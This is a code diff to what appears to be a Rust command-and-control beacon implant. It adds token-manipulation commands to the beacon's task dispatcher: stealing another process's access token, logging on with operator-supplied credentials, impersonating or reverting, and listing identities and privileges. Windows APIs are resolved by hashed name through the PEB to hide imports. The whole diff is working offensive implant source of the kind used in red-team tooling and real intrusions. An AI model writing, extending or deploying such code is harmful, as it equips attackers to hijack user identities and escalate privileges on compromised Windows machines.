@@ -104,6 +104,14 @@ pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut
         Task::Upload { .. } => upload_write(instance, &task, id, results),
         Task::Exfil { action, file_id } => exfil(instance, action, file_id, id, results),
         Task::Screenshot => screenshot_start(instance, id, results),
+        Task::TokenSteal { pid } => token_steal(instance, pid, id, results),
+        Task::TokenMake { .. } => token_make(instance, &task, id, results),
+        Task::TokenImpersonate { token_id } => token_impersonate(instance, token_id, id, results),
+        Task::TokenRevert => token_revert(instance, id, results),
+        Task::TokenList => token_list(instance, id, results),
+        Task::TokenRemove { token_id } => token_remove(instance, token_id, id, results),
+        Task::TokenGetuid => token_getuid(instance, id, results),
+        Task::TokenPrivs => token_privs(instance, id, results),
         Task::Sleep { .. } | Task::Terminate => {}
     }
 }
@@ -1960,4 +1968,654 @@ pub unsafe fn screenshot_tick(instance: &mut Instance, w: &mut Writer) {
         }
         instance.screenshot = None;
     }
+}
+
+// --- tkn (port of the native token.c: steal/make/impersonate/revert/list/
+// remove/getuid/privs — advapi32 by hash, tokens stored in the instance) --
+
+const H_DUPLICATE_TOKEN_EX: u64 = fnv1a64(b"DuplicateTokenEx");
+const H_IMPERSONATE_LOGGED_ON_USER: u64 = fnv1a64(b"ImpersonateLoggedOnUser");
+const H_REVERT_TO_SELF: u64 = fnv1a64(b"RevertToSelf");
+const H_LOGON_USER_A: u64 = fnv1a64(b"LogonUserA");
+const H_OPEN_THREAD_TOKEN: u64 = fnv1a64(b"OpenThreadToken");
+const H_LOOKUP_PRIVILEGE_NAME_A: u64 = fnv1a64(b"LookupPrivilegeNameA");
+const H_GET_CURRENT_THREAD: u64 = fnv1a64(b"GetCurrentThread");
+const ADVAPI32_DLL: &[u8] = b"advapi32.dll\0";
+
+const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+const TOKEN_DUPLICATE: u32 = 0x0002;
+const TOKEN_QUERY: u32 = 0x0008;
+const TOKEN_ALL_ACCESS: u32 = 0xF01FF;
+const SECURITY_IMPERSONATION: u32 = 2;
+const TOKEN_TYPE_PRIMARY: u32 = 1;
+const SE_PRIVILEGE_ENABLED: u32 = 0x2;
+/// TOKEN_USER (1) / TOKEN_PRIVILEGES (3) information classes.
+const TOKEN_USER_CLASS: u32 = 1;
+const TOKEN_PRIVILEGES_CLASS: u32 = 3;
+/// TOKEN_PRIVILEGES layout: `DWORD PrivilegeCount || LUID_AND_ATTRIBUTES[]`
+/// (LUID u64 + Attributes u32, stride 12, array at offset 4).
+const TP_OFF_ENTRIES: usize = 4;
+const TP_ENTRY_STRIDE: usize = 12;
+
+/// One stored token (the native keeps a heap linked list; the instance
+/// array matches the jobs pattern — bounded, no allocation).
+#[derive(Clone, Copy)]
+pub struct TokenEntry {
+    pub handle: isize,
+    pub token_id: u32,
+    pub source_pid: u32,
+    pub user: [u8; 128],
+    pub user_len: usize,
+    pub domain: [u8; 128],
+    pub domain_len: usize,
+}
+
+/// Max stored tokens (the instance array bound).
+pub const MAX_TOKENS: usize = 8;
+
+impl TokenEntry {
+    pub fn empty() -> Self {
+        TokenEntry {
+            handle: 0,
+            token_id: 0,
+            source_pid: 0,
+            user: [0; 128],
+            user_len: 0,
+            domain: [0; 128],
+            domain_len: 0,
+        }
+    }
+}
+
+/// Resolve advapi32 (PEB first, `LoadLibraryA` if absent — screenshot
+/// pattern) plus the kernel32 thread pair.
+unsafe fn token_surface(instance: &Instance) -> Option<(*mut c_void, *mut c_void)> {
+    let peb = crate::runtime::bootstrap::get_peb() as *const specter_core::peb::Peb;
+    let advapi32 = load_module(peb, instance.kernel32, H_ADVAPI32, ADVAPI32_DLL);
+    if advapi32.is_null() {
+        return None;
+    }
+    let current_thread = peb::find_export(instance.kernel32, H_GET_CURRENT_THREAD);
+    if current_thread.is_null() {
+        return None;
+    }
+    Some((advapi32, current_thread))
+}
+
+/// Copy a pack-string field into a NUL-terminated API buffer.
+fn c_field(bytes: &[u8], out: &mut [u8]) -> Option<usize> {
+    c_path_bytes(bytes, out)
+}
+
+/// GetTokenInformation(TokenUser) + LookupAccountSidA: the token holder's
+/// domain and user (empty on failure — the entry still stores).
+unsafe fn token_user_info(
+    advapi32: *mut c_void,
+    h_token: isize,
+    user: &mut [u8; 128],
+    domain: &mut [u8; 128],
+) -> (usize, usize) {
+    let get_info = peb::find_export(advapi32, H_GET_TOKEN_INFORMATION);
+    let lookup = peb::find_export(advapi32, H_LOOKUP_ACCOUNT_SID_A);
+    if get_info.is_null() || lookup.is_null() {
+        return (0, 0);
+    }
+    let get_info = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, u32, *mut c_void, u32, *mut u32) -> i32,
+    >(get_info as *const core::ffi::c_void);
+    let lookup = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(
+            *const c_void,
+            *const c_void,
+            *mut u8,
+            *mut u32,
+            *mut u8,
+            *mut u32,
+            *mut u32,
+        ) -> i32,
+    >(lookup as *const core::ffi::c_void);
+    let mut sid_buf = [0u8; 256];
+    let mut needed: u32 = 0;
+    if get_info(
+        h_token,
+        TOKEN_USER_CLASS,
+        sid_buf.as_mut_ptr() as *mut c_void,
+        sid_buf.len() as u32,
+        &mut needed,
+    ) == 0
+    {
+        return (0, 0);
+    }
+    // TOKEN_USER: SID pointer at offset 0.
+    let sid = u64::from_le_bytes([
+        sid_buf[0], sid_buf[1], sid_buf[2], sid_buf[3], sid_buf[4], sid_buf[5], sid_buf[6],
+        sid_buf[7],
+    ]) as *const c_void;
+    let mut u_len: u32 = user.len() as u32;
+    let mut d_len: u32 = domain.len() as u32;
+    let mut snu: u32 = 0;
+    if lookup(
+        core::ptr::null(),
+        sid,
+        user.as_mut_ptr(),
+        &mut u_len,
+        domain.as_mut_ptr(),
+        &mut d_len,
+        &mut snu,
+    ) == 0
+    {
+        return (0, 0);
+    }
+    (u_len as usize, d_len as usize)
+}
+
+/// `tkn steal`: open the process, duplicate its token into the store.
+///
+/// # Safety
+///
+/// Beacon thread; kernel32 and advapi32 resolvable.
+pub unsafe fn token_steal(instance: &mut Instance, pid: u32, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    if instance.tokens_len >= MAX_TOKENS {
+        error(kernel32, id, results);
+        return;
+    }
+    let Some((advapi32, _)) = token_surface(instance) else {
+        error(kernel32, id, results);
+        return;
+    };
+    let open_process = peb::find_export(kernel32, H_OPEN_PROCESS);
+    let open_token = peb::find_export(advapi32, H_OPEN_PROCESS_TOKEN);
+    let duplicate = peb::find_export(advapi32, H_DUPLICATE_TOKEN_EX);
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if open_process.is_null() || open_token.is_null() || duplicate.is_null() || close.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let open_process = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(u32, i32, u32) -> isize,
+    >(open_process as *const core::ffi::c_void);
+    let open_token = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, u32, *mut isize) -> i32,
+    >(open_token as *const core::ffi::c_void);
+    let duplicate = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, u32, *const c_void, u32, u32, *mut isize) -> i32,
+    >(duplicate as *const core::ffi::c_void);
+    let close = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize) -> i32,
+    >(close as *const core::ffi::c_void);
+
+    let process = open_process(PROCESS_QUERY_INFORMATION, 0, pid);
+    if process == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    let mut h_token: isize = 0;
+    let ok = open_token(process, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_token) != 0;
+    close(process);
+    if !ok {
+        error(kernel32, id, results);
+        return;
+    }
+    let mut dup: isize = 0;
+    let ok = duplicate(
+        h_token,
+        TOKEN_ALL_ACCESS,
+        core::ptr::null(),
+        SECURITY_IMPERSONATION,
+        TOKEN_TYPE_PRIMARY,
+        &mut dup,
+    ) != 0;
+    close(h_token);
+    if !ok || dup == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+
+    instance.next_token_id = instance.next_token_id.saturating_add(1);
+    let token_id = instance.next_token_id;
+    let mut entry = TokenEntry::empty();
+    entry.handle = dup;
+    entry.token_id = token_id;
+    entry.source_pid = pid;
+    let (u_len, d_len) = token_user_info(advapi32, dup, &mut entry.user, &mut entry.domain);
+    entry.user_len = u_len;
+    entry.domain_len = d_len;
+    // Manual copies (memcpy rule): the slices must outlive the entry move.
+    let mut domain = [0u8; 128];
+    let mut user = [0u8; 128];
+    let mut i = 0;
+    while i < d_len {
+        domain[i] = entry.domain[i];
+        i += 1;
+    }
+    let mut i = 0;
+    while i < u_len {
+        user[i] = entry.user[i];
+        i += 1;
+    }
+    instance.tokens[instance.tokens_len] = entry;
+    instance.tokens_len += 1;
+    let _ = transport::push_token_steal_result(
+        &mut *results,
+        id,
+        token_id,
+        pid,
+        &domain[..d_len],
+        &user[..u_len],
+    );
+}
+
+/// `tkn make`: LogonUserA with the operator's credentials.
+///
+/// # Safety
+///
+/// Beacon thread; advapi32 resolvable.
+pub unsafe fn token_make(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    if instance.tokens_len >= MAX_TOKENS {
+        error(kernel32, id, results);
+        return;
+    }
+    let Some((advapi32, _)) = token_surface(instance) else {
+        error(kernel32, id, results);
+        return;
+    };
+    let logon = peb::find_export(advapi32, H_LOGON_USER_A);
+    if logon.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let logon = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8, *const u8, *const u8, u32, u32, *mut isize) -> i32,
+    >(logon as *const core::ffi::c_void);
+    let Task::TokenMake {
+        logon_type,
+        domain_len,
+        domain,
+        user_len,
+        user,
+        pass_len,
+        pass,
+    } = task
+    else {
+        return;
+    };
+    let mut d = [0u8; 128];
+    let mut u = [0u8; 128];
+    let mut p = [0u8; 128];
+    if c_field(&domain[..*domain_len as usize], &mut d).is_none()
+        || c_field(&user[..*user_len as usize], &mut u).is_none()
+        || c_field(&pass[..*pass_len as usize], &mut p).is_none()
+    {
+        error(kernel32, id, results);
+        return;
+    }
+    let mut h_token: isize = 0;
+    let ok = logon(
+        u.as_ptr(),
+        d.as_ptr(),
+        p.as_ptr(),
+        *logon_type,
+        0, // LOGON32_PROVIDER_DEFAULT
+        &mut h_token,
+    ) != 0;
+    // Zero the password buffer whatever happens (the native does).
+    let mut i = 0;
+    while i < p.len() {
+        p[i] = 0;
+        i += 1;
+    }
+    if !ok {
+        error(kernel32, id, results);
+        return;
+    }
+    instance.next_token_id = instance.next_token_id.saturating_add(1);
+    let token_id = instance.next_token_id;
+    let mut entry = TokenEntry::empty();
+    entry.handle = h_token;
+    entry.token_id = token_id;
+    entry.user_len = *user_len as usize;
+    entry.domain_len = *domain_len as usize;
+    // Manual copies (memcpy rule: copy_from_slice lowers to a memcpy
+    // reference and pulls compiler_builtins into the blob).
+    let mut i = 0;
+    while i < entry.user_len {
+        entry.user[i] = user[i];
+        i += 1;
+    }
+    let mut i = 0;
+    while i < entry.domain_len {
+        entry.domain[i] = domain[i];
+        i += 1;
+    }
+    instance.tokens[instance.tokens_len] = entry;
+    instance.tokens_len += 1;
+    let _ = transport::push_token_make_result(&mut *results, id, token_id);
+}
+
+/// `tkn impersonate`: attach a stored token to the beacon thread.
+///
+/// # Safety
+///
+/// Beacon thread; advapi32 resolvable.
+pub unsafe fn token_impersonate(
+    instance: &mut Instance,
+    token_id: u32,
+    id: u32,
+    results: &mut Writer,
+) {
+    let kernel32 = instance.kernel32;
+    let Some((advapi32, _)) = token_surface(instance) else {
+        error(kernel32, id, results);
+        return;
+    };
+    let impersonate = peb::find_export(advapi32, H_IMPERSONATE_LOGGED_ON_USER);
+    if impersonate.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let impersonate = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize) -> i32,
+    >(impersonate as *const core::ffi::c_void);
+    let ok = (|| {
+        let mut i = 0;
+        while i < instance.tokens_len {
+            if instance.tokens[i].token_id == token_id {
+                return impersonate(instance.tokens[i].handle) != 0;
+            }
+            i += 1;
+        }
+        false
+    })();
+    if ok {
+        instance.active_token = token_id;
+    }
+    let _ = transport::push_token_ack(&mut *results, id, transport::COMMAND_TOKEN_IMPRS, ok);
+}
+
+/// `tkn revert`: drop any impersonation.
+///
+/// # Safety
+///
+/// Beacon thread; advapi32 resolvable.
+pub unsafe fn token_revert(instance: &mut Instance, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    let Some((advapi32, _)) = token_surface(instance) else {
+        error(kernel32, id, results);
+        return;
+    };
+    let revert = peb::find_export(advapi32, H_REVERT_TO_SELF);
+    if revert.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let revert = core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn() -> i32>(
+        revert as *const core::ffi::c_void,
+    );
+    let ok = revert() != 0;
+    if ok {
+        instance.active_token = 0;
+    }
+    let _ = transport::push_token_ack(&mut *results, id, transport::COMMAND_TOKEN_REVERT, ok);
+}
+
+/// `tkn list`: the stored tokens.
+///
+/// # Safety
+///
+/// Beacon thread.
+pub unsafe fn token_list(instance: &mut Instance, id: u32, results: &mut Writer) {
+    let count = instance.tokens_len as u32;
+    if !transport::push_token_list_header(&mut *results, id, count) {
+        return;
+    }
+    let mut i = 0;
+    while i < instance.tokens_len {
+        let entry = &instance.tokens[i];
+        if !transport::push_token_list_entry(
+            &mut *results,
+            entry.token_id,
+            entry.source_pid,
+            &entry.domain[..entry.domain_len],
+            &entry.user[..entry.user_len],
+        ) {
+            return;
+        }
+        i += 1;
+    }
+}
+
+/// `tkn remove`: close and forget a stored token (active token: revert
+/// first — the native behavior).
+///
+/// # Safety
+///
+/// Beacon thread; advapi32 resolvable.
+pub unsafe fn token_remove(instance: &mut Instance, token_id: u32, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    let mut found = false;
+    let mut i = 0;
+    while i < instance.tokens_len {
+        if instance.tokens[i].token_id == token_id {
+            found = true;
+            if instance.active_token == token_id {
+                let revert = peb::find_export(
+                    load_module(
+                        crate::runtime::bootstrap::get_peb() as *const specter_core::peb::Peb,
+                        kernel32,
+                        H_ADVAPI32,
+                        ADVAPI32_DLL,
+                    ),
+                    H_REVERT_TO_SELF,
+                );
+                if !revert.is_null() {
+                    let revert = core::mem::transmute::<
+                        *const core::ffi::c_void,
+                        unsafe extern "system" fn() -> i32,
+                    >(revert as *const core::ffi::c_void);
+                    revert();
+                }
+                instance.active_token = 0;
+            }
+            if !close.is_null() {
+                let close = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(isize) -> i32,
+                >(close as *const core::ffi::c_void);
+                close(instance.tokens[i].handle);
+            }
+            // Remove: shift the tail left (jobs pattern).
+            let mut j = i;
+            while j + 1 < instance.tokens_len {
+                instance.tokens[j] = instance.tokens[j + 1];
+                j += 1;
+            }
+            instance.tokens_len -= 1;
+            break;
+        }
+        i += 1;
+    }
+    let _ = transport::push_token_ack(&mut *results, id, transport::COMMAND_TOKEN_REMOVE, found);
+}
+
+/// `tkn getuid`: the CURRENT identity — thread token when impersonating,
+/// process token otherwise (unlike COMMAND_GETUID which always shows the
+/// process identity).
+///
+/// # Safety
+///
+/// Beacon thread; advapi32 resolvable.
+pub unsafe fn token_getuid(instance: &mut Instance, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    let Some((advapi32, current_thread)) = token_surface(instance) else {
+        error(kernel32, id, results);
+        return;
+    };
+    let open_thread_token = peb::find_export(advapi32, H_OPEN_THREAD_TOKEN);
+    let open_process_token = peb::find_export(advapi32, H_OPEN_PROCESS_TOKEN);
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if open_thread_token.is_null() || open_process_token.is_null() || close.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let open_thread_token = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, u32, i32, *mut isize) -> i32,
+    >(open_thread_token as *const core::ffi::c_void);
+    let open_process_token = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, u32, *mut isize) -> i32,
+    >(open_process_token as *const core::ffi::c_void);
+    let close = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize) -> i32,
+    >(close as *const core::ffi::c_void);
+    let current_thread = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn() -> isize,
+    >(current_thread as *const core::ffi::c_void);
+
+    let mut h_token: isize = 0;
+    let mut user = [0u8; 128];
+    let mut domain = [0u8; 128];
+    let ok = if open_thread_token(current_thread(), TOKEN_QUERY, 0, &mut h_token) != 0 {
+        true
+    } else {
+        // No thread token (not impersonating): the process token.
+        // GetCurrentProcess pseudo-handle is -1.
+        open_process_token(-1, TOKEN_QUERY, &mut h_token) != 0
+    };
+    if !ok {
+        error(kernel32, id, results);
+        return;
+    }
+    let (u_len, d_len) = token_user_info(advapi32, h_token, &mut user, &mut domain);
+    close(h_token);
+    if u_len == 0 && d_len == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    let mut uid = [0u8; 260];
+    let mut n = 0usize;
+    let mut i = 0;
+    while i < d_len && n < uid.len() {
+        uid[n] = domain[i];
+        n += 1;
+        i += 1;
+    }
+    if n < uid.len() {
+        uid[n] = b'\\';
+        n += 1;
+    }
+    let mut i = 0;
+    while i < u_len && n < uid.len() {
+        uid[n] = user[i];
+        n += 1;
+        i += 1;
+    }
+    let _ = transport::push_token_getuid_result(&mut *results, id, &uid[..n]);
+}
+
+/// `tkn privs`: the current token's privileges.
+///
+/// # Safety
+///
+/// Beacon thread; advapi32 resolvable.
+pub unsafe fn token_privs(instance: &mut Instance, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    let Some((advapi32, _)) = token_surface(instance) else {
+        error(kernel32, id, results);
+        return;
+    };
+    let open_process_token = peb::find_export(advapi32, H_OPEN_PROCESS_TOKEN);
+    let get_info = peb::find_export(advapi32, H_GET_TOKEN_INFORMATION);
+    let lookup = peb::find_export(advapi32, H_LOOKUP_PRIVILEGE_NAME_A);
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if open_process_token.is_null() || get_info.is_null() || lookup.is_null() || close.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let open_process_token = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, u32, *mut isize) -> i32,
+    >(open_process_token as *const core::ffi::c_void);
+    let get_info = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, u32, *mut c_void, u32, *mut u32) -> i32,
+    >(get_info as *const core::ffi::c_void);
+    let lookup = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8, *const u64, *mut u8, *mut u32) -> i32,
+    >(lookup as *const core::ffi::c_void);
+    let close = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize) -> i32,
+    >(close as *const core::ffi::c_void);
+
+    let mut h_token: isize = 0;
+    if open_process_token(-1, TOKEN_QUERY, &mut h_token) == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    let mut buf = [0u8; 1024];
+    let mut needed: u32 = 0;
+    let ok = get_info(
+        h_token,
+        TOKEN_PRIVILEGES_CLASS,
+        buf.as_mut_ptr() as *mut c_void,
+        buf.len() as u32,
+        &mut needed,
+    ) != 0;
+    close(h_token);
+    if !ok {
+        error(kernel32, id, results);
+        return;
+    }
+    let count = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;
+    let count = count.min((buf.len() - TP_OFF_ENTRIES) / TP_ENTRY_STRIDE);
+    if !transport::push_token_privs_header(&mut *results, id, count as u32) {
+        return;
+    }
+    let mut written = 0usize;
+    let mut i = 0;
+    while i < count {
+        let base = TP_OFF_ENTRIES + i * TP_ENTRY_STRIDE;
+        let luid = u64::from_le_bytes([
+            buf[base],
+            buf[base + 1],
+            buf[base + 2],
+            buf[base + 3],
+            buf[base + 4],
+            buf[base + 5],
+            buf[base + 6],
+            buf[base + 7],
+        ]);
+        let attrs =
+            u32::from_le_bytes([buf[base + 8], buf[base + 9], buf[base + 10], buf[base + 11]]);
+        let mut name = [0u8; 64];
+        let mut name_len: u32 = name.len() as u32;
+        if lookup(core::ptr::null(), &luid, name.as_mut_ptr(), &mut name_len) != 0 {
+            let enabled = attrs & SE_PRIVILEGE_ENABLED != 0;
+            if !transport::push_token_privs_entry(
+                &mut *results,
+                enabled,
+                &name[..name_len as usize],
+            ) {
+                return;
+            }
+            written += 1;
+        }
+        i += 1;
+    }
+    let _ = written;
 }
